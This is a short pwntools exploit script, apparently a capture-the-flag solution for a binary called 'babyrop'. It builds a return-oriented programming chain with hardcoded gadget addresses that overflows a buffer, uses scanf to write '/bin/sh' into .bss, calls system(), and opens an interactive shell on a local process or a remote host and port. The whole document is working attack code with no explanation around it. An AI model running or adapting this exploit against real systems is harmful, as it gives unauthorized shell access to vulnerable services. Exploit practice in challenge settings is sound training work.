from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "babyrop"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil ("> ")

def menu (idx):
  rr ()
  r.sendline (str(idx))


bss = elf.bss (0xa00)

prdi =  0x400683 
prsip = 0x400681
system =  0x400490 
leaveret = 0x400619 
scanf = 0x4004c0
aS = 0x4006c5
pay = "A"*0x18  + p64 (prdi) + p64 (aS) + p64(prsip)+ p64(bss)*2 + p64(scanf) + p64(prdi) + p64(bss) + p64(system)

r.sendline (pay)

r.sendline ("/bin/sh\x00")
r.interactive ()
